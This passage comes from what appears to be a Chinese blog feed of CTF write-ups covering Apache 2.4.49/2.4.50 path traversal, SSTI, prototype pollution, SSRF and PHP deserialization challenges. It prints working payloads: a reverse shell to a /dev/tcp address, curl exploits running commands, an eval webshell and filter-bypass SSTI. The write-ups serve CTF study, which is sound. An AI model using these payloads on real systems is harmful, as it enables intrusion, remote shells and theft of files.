&#x2F;dev&#x2F;tcp&#x2F;192.168.190.146&#x2F;8888 0&gt;&amp;1&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&quot;url perl复制代码CVE-2021-42013</code></pre><p>影响版本：<code>Apache 2.4.49 和 Apache 2.4.50</code></p><p>poc:</p><pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;etc&#x2F;passwdcurl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&#39;curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; whoami&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&quot;</code></pre><p>从响应可以看到是apache2.4.50版本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132536774.png" alt="image-20221020132536774"></p><p>如果服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p><p>直接构造payload进行rce</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132755497.png" alt="image-20221020132755497"></p><h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&#123;    if(preg_match(&#39;&#x2F;bash|curl&#x2F;i&#39;,$_GET[&quot;cmd&quot;]))&#123;        echo &quot;Hacker!&quot;;    &#125;else&#123;        shell_exec($_GET[&quot;cmd&quot;]);    &#125;&#125;else&#123;    show_source(__FILE__);&#125;</code></pre><p>可以直接写文件，记得转义$号</p><pre class="language-txt" data-language="txt"><code class="language-txt">?cmd&#x3D;echo &quot;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&quot; &gt; 1.php</code></pre><p>可以看到根目录下有flag文件，但是因为是700的权限，所以我们需要提权</p><p>这里是利用的suid提权</p><p>find / -user root -perm -4000 -print 2&gt;/dev/null</p><p>不知道为什么在蚁剑的虚拟终端里没显示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140222567.png" alt="image-20221020140222567"></p><p>看到有date，就可以利用date命令读取flag文件</p><p>这里在网页不会有回显，可能是因为date是通过报错把文件读出来的，但是网页没有回显Linux里的报错。(猜的，没验证过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140729163.png" alt="image-20221020140729163"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTFxCBCTF</title>
      <link href="/2022/09/20/DASCTFxCBCTF/"/>
      <url>/2022/09/20/DASCTFxCBCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>进入后是一个3d版的游戏，死亡后会提示说玩够一百万分就能拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920164212534.png" alt="QQ截图20220920165732"></p><p>先来个非预期</p><p>我们在控制台可以看到score的属性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175500274.png" alt="image-20220920175500274"></p><p>我们可以通过修改score.score的方式来修改我们的分数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175655019.png" alt="image-20220920175655019"></p><p>然后是预期解</p><p>在js的源码里可以看到最后有这么一部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920175915900.png" alt="image-20220920175915900"></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token function">sn</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token punctuation">,</span> t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e <span class="token operator">&amp;&amp;</span> t <span class="token operator">&amp;&amp;</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/check.php"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>        headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded; charset=UTF-8"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> <span class="token string">"score="</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;checkCode="</span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;tm="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span>e<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>e和t分别为分数和checkCode</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180224487.png" alt="image-20220920180224487"></p><p>checkCode由两部分组成</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180251683.png" alt="image-20220920180251683"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920180305217.png" alt="image-20220920180305217"></p><p>所以t=checkCode=DASxCBCTF_wElc03e</p><p>也就是向check.php发送post请求，其中有三个参数，score、checkCode、tm，score是我们的分数。我们可以设成1000000，这里的checkCode是md5(score.score+checkCode)，及md5(1000000DASxCBCTF_wElc03e),tm就是个时间戳</p><p>所以可以编写脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:27211&#x2F;check.php&#39;headers &#x3D; &#123;              &quot;Content-type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;          &#125;data &#x3D; &#123;    &quot;score&quot;: &quot;1000000&quot;,    &quot;checkCode&quot;: &#39;4639d0ab43e9030749f450eb6e9fbb97&#39;,    &quot;tm&quot;: str(time.time())[:10]&#125;rep &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers).textprint(rep)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920181636482.png" alt="image-20220920181636482"></p><h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p>SSTI但是过滤了<code>&#123;&#123;</code>，然后还把输入的内容进行了反序输出的操作，所以我们的payload在输入之前就要有一个反序的操作</p><p><code>&#123;&#123;</code>没了可以用<code>&#123;%%&#125;</code>替代</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920184914991.png" alt="image-20220920184914991"></p><p>照着这个payload改一下</p><pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read())%&#125;</code></pre><p>改了之后的payload为</p><pre class="language-none"><code class="language-none">&#123;%print(&#39;&#39;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;nl &#x2F;flag&#39;).read())%&#125;</code></pre><p>然后逆序一下</p><pre class="language-none"><code class="language-none">&#125;%))(daer.)&#39;galf&#x2F; ln&#39;(]&#39;nepop&#39;[__slabolg__.__tini__.]231[)(__sessalcbus__.__esab__.__ssalc__.&#39;&#39;(tnirp%&#123;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920185701419.png" alt="image-20220920185701419"></p><h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>js的题，有附件，down下来审一下，主要是app.js。</p><p>题目主要功能就是用钱来买flag，但是普通用户只有10$，不可能买到11$的flag，而admin用户有9999，可以用来购买flag，于是我们就需要登录admin账号</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223605085.png" alt="image-20220920223605085"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223623009.png" alt="image-20220920223623009"></p><p>从这里可以得到密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223814625.png" alt="image-20220920223814625"></p><p>登录之后发现钱够了但还是买不到flag。因为源码里在购买的部分还存在验证</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223922197.png" alt="image-20220920223922197"></p><p>product的值就是我们的传参</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224005169.png" alt="image-20220920224005169"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224014603.png" alt="image-20220920224014603"></p><p>然后存在三个if判断，首先判断id是否为2，然后判断money是否大于11，并且是否存在一个user.token，最后一个if判断我们post传入的内容是否有flag这个关键字，如果有就提示go to ’readFileSync‘。如果没有就读取文件名为name的值的文件里面的内容。</p><p>第一个条件好满足，我们先来看第二个。首先我们知道user的构造如下，并没有token这个属性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920224521771.png" alt="image-20220920224521771"></p><p>所以如果我们想添加一个user.token的值，就需要借助原型链污染（<a href="https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/">js漏洞 | Ethe&#39;s blog (ethe448.github.io)</a>）。而代码中正好存在利用的地方，这是一个进行复制操作的函数。</p><p><code>    Object.assign(order[user.username], product);</code></p><p>如果user.username=__proto__，那么在执行这段代码的时候，就会造成我们的原型链污染。product的值我们可控。也就实现了为其添加user对象添加token属性的目的</p><p>所以首先是把user.username改成__proto__</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223520791.png" alt="image-20220920223520791">接下来就是传入product，name的值是我们想读的文件名，也就是/flag，然后添加一个token属性就可以。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223407034.png" alt="image-20220920223407034"></p><p>由于第三个if的原因，所以第一次传参的时候是会被拦下来的。所以我们需要第二次传参，因为之前我们以及把name的值赋成了/flag，所以第二次传参就不再需要了（其实第二次随便传个json格式的内容就行，只要不覆盖第一次传的值。）。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220920223342590.png" alt="image-20220920223342590"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>天山固网</title>
      <link href="/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/"/>
      <url>/2022/06/28/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p>为什么报名是学生组打比赛分到了企业组捏，企业这群人也太卷了</p><p>（只有web是我做的，其他跟我没啥关系</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="尝试一下解密？"><a href="#尝试一下解密？" class="headerlink" title="尝试一下解密？"></a>尝试一下解密？</h2><p>url解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ciscn2022/image-20220626141958790.png" alt="image-20220626141958790"></p><h2 id="简单的图片"><a href="#简单的图片" class="headerlink" title="简单的图片"></a>简单的图片</h2><p>拖进gimp里看到有三个图层，删去最上边的一个，就能看见flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160445309.png" alt="image-20220626160445309"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160608764.png" alt="image-20220626160608764"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>sql盲注，唯一的问题是这里只允许最大有四个参数，所以在盲注第五个数时要删去第一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143623880.png" alt="image-20220626143623880"></p><h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>利用file协议查看etc/hosts文件，找到主机的网段</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143722528.png" alt="image-20220626143722528"></p><p>bp扫一下，发现在100里有内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626144207786.png" alt="image-20220626144207786"></p><p>接下来就是利用gopher协议把referer=dasctf.com带进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145210597.png" alt="image-20220626145210597"></p><p>提示要post一个参数dasctf，而且这个参数还要等于flag</p><p>重新构造gopher语句，最终得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145241386.png" alt="image-20220626145241386"></p><h2 id="MagicalType"><a href="#MagicalType" class="headerlink" title="MagicalType"></a>MagicalType</h2><p>robots.txt里有个hint.php,访问一下，发现源码里是些html代码，拖到文档里改成html格式</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626151308282.png" alt="image-20220626151308282"></p><p>利用数组溢出和filter伪协议读index.php的文件内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153834734.png" alt="image-20220626153834734"></p><p>解码之后是个反序列化</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);class Evil&#123;    public $flag &#x3D; 1;    public function __wakeup()    &#123;        $this-&gt;flag &#x3D; 0;    &#125;    public function __destruct()    &#123;        if($this-&gt;flag &#x3D;&#x3D; 1)        &#123;            echo(&quot;How you did it?&quot;);            $xux &#x3D; file_get_contents($_GET[&#39;xux&#39;]);            create_function(&quot;&quot;,$xux);        &#125;        else&#123;            die(&quot;nonono&quot;);        &#125;    &#125;&#125;$o &#x3D; $_GET[&#39;o&#39;];if(isset($o))&#123;    unserialize($o);&#125;</code></pre><p>我们要利用的函数就算create_function，这个函数有个命令注入的漏洞。而$xux参数可以利用data协议进行控制，至于wakeup的绕过可以将最前面的O改成C（陇原战役里考过</p><p>之后发现空格也被过滤了，用${IFS}绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153756895.png" alt="image-20220626153756895"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="掩耳盗铃"><a href="#掩耳盗铃" class="headerlink" title="掩耳盗铃"></a>掩耳盗铃</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145446137.png" alt="image-20220626145446137"></p><p>压缩包解压出来的改成ppt格式然后把叠加的图层全删了</p><h2 id="chrchrchr"><a href="#chrchrchr" class="headerlink" title="chrchrchr"></a>chrchrchr<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162933197.png" alt="image-20220626162933197"></h2><p>感觉像蚁剑的流量，蚁剑加密的方式就是base64加密之后再在前面添几位，所以从tcp流18开始往后找，删掉前两个字符先url解码再base64解码，把写入a.txt的内容拼起来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162737108.png" alt="image-20220626162737108"></p><pre class="language-none"><code class="language-none">KJCUMVCRGFJEOZL2JJWE2V2RGNMW2SLXJZLVCM2ONJWGUTLNJZVU2VCBPBHFIZDIJZVFSMCOIRSGQTKHKJVWMUJ5HU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;然后进行base32解码，再base64得到flag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626163754458.png" alt="image-20220626163754458"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="measyasm"><a href="#measyasm" class="headerlink" title="measyasm"></a>measyasm</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150259303.png" alt="image-20220626150259303"></p><p>自减</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150733844.png" alt="image-20220626150733844"></p><h2 id="PEinM"><a href="#PEinM" class="headerlink" title="PEinM"></a>PEinM</h2><p>拖进ida里动调</p><p>能看出来在这里有一个被魔改过的xxtea</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626174638274.png" alt="image-20220626174638274"></p><p>逆一下脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9E377AB9 #define MX (((z&gt;&gt;4^y&lt;&lt;3) + (y&gt;&gt;4^z&lt;&lt;3)) ^ ((sum^y) + (key[p&amp;0xa^e] ^ z)))  unsigned long long Summation(int n, unsigned long long delat)&#123;        unsigned long long sum &#x3D; 0;        for(int i &#x3D; 0; i &lt; 52&#x2F;n+6; i++)                sum +&#x3D; delat;        return sum;&#125;void btea(unsigned long long *v, int n, unsigned long long const key[4])   &#123;                                                          unsigned long long y, z, sum;                                   unsigned p, round, e;                                if (n &gt; 1)             &#123;        round &#x3D; 6 + 52&#x2F;n;                       sum &#x3D; 0;                                z &#x3D; v[n-1];                             do        &#123;            sum +&#x3D; DELTA;                           e &#x3D; (sum &gt;&gt; 2) &amp; 3;                    for (p&#x3D;0; p&lt;n-1; p++)                   &#123;                y &#x3D; v[p+1];                v[p] +&#x3D; MX;                      z &#x3D; v[p];                             &#125;            y &#x3D; v[0];            z &#x3D; v[n-1] +&#x3D; MX;        &#125;        while (--round);    &#125;    else if (n &lt; -1)    &#123;        n &#x3D; -n;        round &#x3D; 6 + 52&#x2F;n;        sum &#x3D; Summation(n, DELTA);         y &#x3D; v[0];        do        &#123;            e &#x3D; (sum &gt;&gt; 2) &amp; 3;            for (p&#x3D;n-1; p&gt;0; p--)            &#123;                z &#x3D; v[p-1];                y &#x3D; v[p] -&#x3D; MX;            &#125;            z &#x3D; v[n-1];            y &#x3D; v[0] -&#x3D; MX;            sum -&#x3D; DELTA;        &#125;        while (--round);    &#125;&#125;int main()&#123;    unsigned long long v[]&#x3D; &#123;0xBD548E45099A220B, 0x50BB9976358C558A, 0x20598FD852017357, 0xDC9B969877F6E8C2, 0xBEC5A96D9ECC6B87, 0x34D1D0E4390DF96D, 0x6796AEADE501CC5D, 0xDC643460C1430B8F, 0x7CA5CE8BE64FE5EE, 0x066B317D2C139F9B&#125;;    unsigned long long const k[]&#x3D; &#123;0x0000000000000052, 0x0000000000000033, 0x0000000000000076, 0x0000000000000045, 0x0000000000000072, 0x0000000000000073, 0x0000000000000033, 0x000000000000005F, 0x0000000000000031, 0x0000000000000053, 0x000000000000005F, 0x0000000000000045, 0x0000000000000061, 0x0000000000000053, 0x0000000000000079, 0x000000000000000A&#125;;    int n &#x3D; 0xa;     btea(v, -n, k);    for(int i &#x3D; 0; i &lt; 8*n; i++)    &#123;        printf(&quot;%c&quot;, ((unsigned char *)&amp;v)[i]);    &#125;    return 0;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626175648015.png" alt="image-20220626175648015"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rssssa9"><a href="#rssssa9" class="headerlink" title="rssssa9"></a>rssssa9</h2><p>照着题目逆推脚本，用sage</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165422972.png" alt="image-20220626165422972"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626165353341.png" alt="image-20220626165353341"></p><p>交了一下结果不对</p><p>发现是加密的时候在后边填了点东西</p><p>再去掉加密里加上的最后那段123....321就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dest0g3 520迎新赛wp</title>
      <link href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/"/>
      <url>/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>和wm2020年的题一样</p><blockquote><p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果require_once(‘flag.php’)，include的文件不运行再通过require_once包含。<br>通过知识点：/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，利用伪协议配合多级符号链接的办法进行绕过。</p></blockquote><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520133732748.png" alt="image-20220520133732748"></p><p>解码拿到flag</p><p><a href="https://www.anquanke.com/post/id/213235#h3-3">php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com)</a></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>应该是要利用报错进入set_error_handler里，传个数组就成功了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520134227015.png" alt="image-20220520134227015"></p><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>利用进制编码和通配符绕过</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">aaa&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;uniq &#x2F;f*&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520135650912.png" alt="image-20220520135650912"></p><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>用这篇文章里的方法改改就行<a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p><pre class="language-none"><code class="language-none">首先用%0a绕过空格的过滤，然后利用&#123;%%&#125;和set绕过关键字，利用pop和()|select|string|list得到下划线，最后就是用__getitem__构造类似x.__init__.__globals__[&#39;__builtins__&#39;].chr 这种payload得到chr和open，猜测flag在根目录下的&#x2F;flag中，尝试读取最终payload</code></pre><pre class="language-python" data-language="python"><code class="language-python">username&#x3D;&#123;%set%0apo&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;%set%0aa&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aini&#x3D;(a,a,dict(in&#x3D;a,it&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0aglo&#x3D;(a,a,dict(gl&#x3D;a,obals&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ageti&#x3D;(a,a,dict(getit&#x3D;a,em&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0abuilt&#x3D;(a,a,dict(bui&#x3D;a,ltins&#x3D;a)|join,a,a)|join()%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%%0aset%0ach&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;%set%0ax&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%set%0achr&#x3D;(x|attr(geti))(ch)%&#125;&#123;%set%0afile&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%%0aset%0aop&#x3D;dict(ope&#x3D;a,n&#x3D;a)|join%&#125;&#123;%set%0aopen&#x3D;(x|attr(geti))(op)%&#125;&#123;%%0aset%0are&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;%print(open(file)|attr(re)())%&#125;&amp;password&#x3D;x</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521162208161.png" alt="image-20220521162208161"></p><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);function waf($data)&#123;    if (is_array($data))&#123;        die(&quot;Cannot transfer arrays&quot;);    &#125;    if (preg_match(&#39;&#x2F;get|air|tree|apple|banana|php|filter|base64|rot13|read|data&#x2F;i&#39;, $data)) &#123;        die(&quot;You can&#39;t do&quot;);    &#125;&#125;class air&#123;    public $p;    public function __set($p, $value) &#123;        $p &#x3D; $this-&gt;p-&gt;act;        echo new $p($value);    &#125;&#125;class tree&#123;    public $name;    public $act;    public function __destruct() &#123;        return $this-&gt;name();    &#125;    public function __call($name, $arg)&#123;        $arg[1] &#x3D;$this-&gt;name-&gt;$name;    &#125;&#125;class apple &#123;    public $xxx;    public $flag;    public function __get($flag)    &#123;        $this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag;    &#125;&#125;class D &#123;    public $start;    public function __destruct()&#123;        $data &#x3D; $_POST[0];        if ($this-&gt;start &#x3D;&#x3D; &#39;w&#39;) &#123;            waf($data);            $filename &#x3D; &quot;&#x2F;tmp&#x2F;&quot;.md5(rand()).&quot;.jpg&quot;;            file_put_contents($filename, $data);            echo $filename;        &#125; else if ($this-&gt;start &#x3D;&#x3D; &#39;r&#39;) &#123;            waf($data);            $f &#x3D; file_get_contents($data);            if($f)&#123;                echo &quot;It is file&quot;;            &#125;            else&#123;                echo &quot;You can look at the others&quot;;            &#125;        &#125;    &#125;&#125;class banana &#123;    public function __get($name)&#123;        return $this-&gt;$name;    &#125;&#125;&#x2F;&#x2F; flag in &#x2F;if(strlen($_POST[1]) &lt; 55) &#123;    $a &#x3D; unserialize($_POST[1]);&#125;else&#123;    echo &quot;str too long&quot;;&#125;throw new 